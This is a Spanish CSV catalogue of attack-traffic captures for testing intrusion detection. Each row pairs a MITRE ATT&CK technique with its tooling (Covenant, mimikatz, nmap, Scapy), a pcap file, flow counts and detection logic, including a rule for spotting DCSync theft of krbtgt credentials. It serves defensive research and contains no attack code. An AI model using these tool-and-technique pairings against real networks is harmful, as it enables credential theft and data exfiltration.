TÁCTICA,OTRAS TÁCTICAS,ID TÁCTICA,TÉCNICA,ID TÉCNICA,SUBTÉCNICA,ID SUBTÉCNICA,ATAQUE,HERRAMIENTA,FICHERO PCAP,PROTOCOLO BASE DE ATAQUE,Nº TOTAL DE FLUJOS,Nº DE FLUJOS CON ATAQUE/S,Nº DE FLUJOS CON ATAQUE/S COLATERAL/ES,Nº DE MENSAJES DE RED CON ATAQUE/S,Nº ATAQUES (INSTANCIAS) TOTALES,Nº ATAQUES (INSTANCIAS) PRINCIPALES,Nº ATAQUES (INSTANCIAS) COLATERALES,ATAQUE/S COLATERAL/ES - EXPLICACIÓN,DETECTABLE POR PATRONES,MECANISMO DE DETECCIÓN,DETALLES DE IMPLEMENTACIÓN DE ATAQUE,PROCESO DE GENERACIÓN DE PCAP,VALIDACIÓN DE PCAP,ANÁLISIS DE DETECCIONES DE PCAP (Snort),FORMATO PCAPNG,DETECTABILIDAD,ATAQUES COLATERALES,VERIFICACIÓN MTU MÁXIMA,ERROR TCP_REPLAY,CONTIENE SÓLO FLUJOS COMPLETOS CON SYN INICIAL,NIVEL DE ATAQUE (Contexto de Ataque),JUSTIFICACIÓN NIVEL DE ATAQUE (Contexto de Ataque),NIVEL DE ATAQUE (MODELO OSI),TRAMAS > 4000 Bytes,USADO PARA CÁLCULO DE CAPACIDAD DE DETECCIÓN
Command and Control,-,TA0040,Data Obfuscation,T1001,Steganography,T1001.002,Inserción de información confidencial en una imagen JPG,"Covenant, SSH, scp, Powershell",T1001.002-Data_obfuscation_steganography_[4].pcapng,SSH,1,1,0,1,1,1,0,-,NO,"Detección por anomalías y/o estegoanálisis, envío de imágenes o ficheros con formato poco común entre equipos, existencia de ficheros comprimidos sospechosos, etc.",-,Manual [4] / 3.18,Manual [4] / B.18,Manual [4] / 4.18,1,1,0,1,0,1,LV1,El uso de técnicas esteganográficas para ocultar datos es unívoca. No puede confundirse con actividad legítima,L3,0,0
Command and Control,-,TA0040,Data Obfuscation,T1001,Protocol Impersonation,T1001.003,Falsificación de protocolos de conexión segura como SSL o TLS,FakeTLS (raykaryshyn Github),T1001.003-Data_obfuscation_protocol_impersonation_[4].pcapng,TLS,1,1,0,1,1,1,0,-,SI,Regla genérica que analice el contenido y la estructura de los paquetes enviados para detectar una falsificación de protocolo. Adicionalmente se puede detectar con una regla personalizada que compruebe el campo Server Name y mediante DNS asegure si se corresponde con la dirección IP a la que se está accediendo.,-,Manual [4] / 3.17,Manual [4] / B.17,Manual [4] / 4.17,1,1,0,1,0,1,LV1,La falsificación del protocolo TLS para acceder al equipo víctima es únivoca. No puede confundirse con actividad legítima.,L3,0,1
Credential Access,-,TA0006,OS Credential Dumping,T1003,DCSync,T1003.006,Obtención de credenciales del usuario krbtgt (Usuario Kerberos Active Directory),mimikazt,T1003-Os_credential_dumping_dcsync_[4].pcapng,DCERPC,3,1,0,1,1,1,0,-,SI,Regla compuesta que detecte una llamada DCERPC Bind a la API DRSUAPI seguida de una llamada a la función DsGetNCChanges,-,Manual [4] / 3.11,Manual [4] / B.11,Manual [4] / 4.11,1,1,0,1,0,1,LV1,La obtención de credenciales del usuario krbtgt de manera no autorizada supone siempre un ataque,L3,0,1
Command and Control,-,TA0040,Fallback Channels,T1008,-,-,Traspaso de canal primario C2 a canal alternativo,Covenant,T1008-Fallback_channels_[4].pcapng,SMB2,6,2,1,2,3,2,1,Establecimiento del canal C&C primario mediante Covenant - Command and Control,SI*,"La detección de la creación del canal es posible para este caso concreto, en el que el cortafuegos detecta la creación de ambos canales. Sin embargo, si ambos canales, tanto primario como secundario están establecidos, y no se ha detectado su creación, el cambio de uno a otro es inapreciable por el cortafuegos.",-,Manual [4] / 3.19,Manual [4] / B.19,Manual [4] / 4.19,1,1,0,1,0,1,LV1,La creación de un canal secundario de C&C siempre es un ataque,L3,1,1
Exfiltration,-,TA0010,Exfiltration Over Other Network Medium,T1011,Exfiltration Over Bluetooth,T1011.001,Extracción via Bluetooth,"Covenant, btobex, Bluetooth",T1011-Exfiltration_over_bluetooth_[4].pcapng,BLUETOOTH,1,1,0,1,1,1,0,-,NO,Detección por anomalías en red Bluetooth. Envío y/o recepción de información comprometida por la red Bluetooth,-,Manual [4] / 3.23,Manual [4] / B.23,Manual [4] / 4.23,1,1,0,1,1,1,LV2,El uso de Bluetooth para extraer datos puede darse en contextos legítimos,L2,1,0
Discovery,-,TA0007,Remote System Discovery,T1018,-,-,Descubrimiento de servicios y puertos,nmap,T1018-service_discovery_[3].pcapng,TCP,1002,1002,0,1002,1002,1002,0,-,SI,Regla que detecte envío de mútliples peticiones a un rango de puertos en un tiempo determinado,-,Manual [3] / 3.8.1,Manual [3] / 3.8.1.4,Manual [3] / 3.8.1.5,1,1,0,1,0,1,LV1,"El descubrimiento de servicios, de forma general, se califica como ataque",L3,0,1
Exfiltration,-,TA0010,Automated Exfiltration,T1020,Traffic Duplication,T1020.001,Ejecución de script en Python para activar el reenvío de paquetes en el equipo víctima,"SSH, Scapy",T1020.001-Automated_exfiltration_traffic_duplication_[4].pcapng,SSH,26,1,0,1,1,1,0,-,NO,Detección por anomalías en red que detecte el envío duplicado de paquetes procedentes de un mismo origen interno a la organización,-,Manual [4] / 3.24,Manual [4] / B.24,Manual [4] / 4.24,1,1,0,1,0,1,LV1,La ejecución de un script que habilite el reenvío de paquetes en el equipo víctima es un ataque,L3,0,0
Lateral Movement,-,TA0008,Remote Services,T1021,SSH,T1021.004,Sesión SSH,SSH,T1021-remote_services_ssh_[3].pcapng,SSH,1,1,0,1,1,1,0,-,SI*,"Regla genérica para detectar conexiones SSH entre un orígen y un servidor o destino dentro de la red a proteger. *Este ataque, si bien es detectable por red, es idéntico a un acceso legítimo, por lo que no es posible diferenciar uno de otro (salvo por anomalías relacionadas con direcciones IP o usuarios poco comunes)",-,Manual [3] / 3.8.10,Manual [3] / 3.8.10.4,Manual [4] / 4.1.48,1,1,0,1,0,1,LV2,"El uso de SSH es genérico, no siempre tiene que tratarse de un ataque",L3,0,1
Exfiltration,-,TA0010,Scheduled Transfer,T1029,-,-,Comunicación C2 para el establecimiento de extracción programada,"Covenant, Powershell",T1029-Scheduled_transfer_[4].pcapng,HTTP,9,1,1,1,2,1,1,Establecimiento del canal C&C para la programación de la transferencia - Command and Control,NO,"Detección por anomalías, basada en el descubrimiento de eventos programados que no han sido creados por el usuario.",-,Manual [4] / 3.25,Manual [4] / B.25,Manual [4] / 4.25,1,1,0,1,0,1,LV1,La programación de una exfiltración de datos es siempre un ataque,L3,1,0
Exfiltration,-,TA0010,Data Transfer Size Limits,T1030,-,-,Dividir archivos para realizar transferencias menores a un umbral que provoque alertas,"ftp, split",T1030-Transfer_Size_Limits_[5].pcapng,FTP,68,1,1,1,2,1,1,"En el proceso de ataque se hace uso de un Shell Remoto, pero no es la función principal",NO**,"Dependiendo la forma en la que se envien los archivos, puede ser indetectable. Sin embargo, si utiliza protocolos de transferencia de ficheros (FTP,SMB...) resulta importante monitorizar transferencias con un mismo tamaño de manera concurrente","Transferencia de ficheros mediante FTP, previamente divididos en paquetes de un tamaño constante",Manual [5] / 4.9.1,Manual [5] / C.1,Manual [5] / 5.12.5,1,1,0,1,0,1,LV2,La división en partes para la transferencia de un fichero no necesariamente es un ataque,L3,1,0
